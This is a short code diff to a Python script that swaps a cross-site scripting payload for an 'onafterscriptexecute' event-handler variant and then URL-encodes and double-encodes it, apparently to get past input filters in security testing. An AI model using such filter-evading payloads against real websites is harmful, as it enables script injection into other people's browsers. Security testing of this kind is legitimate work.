@@ -1,7 +1,7 @@
 import urllib.parse
 import time
 
-payload ='"><script>alert(1)</script>'
+payload ='"><xss onafterscriptexecute=alert(1)><script>1</script>'
 encodePayload = urllib.parse.quote_plus(payload)
 doubleEncodePayload = urllib.parse.quote_plus(encodePayload)
 
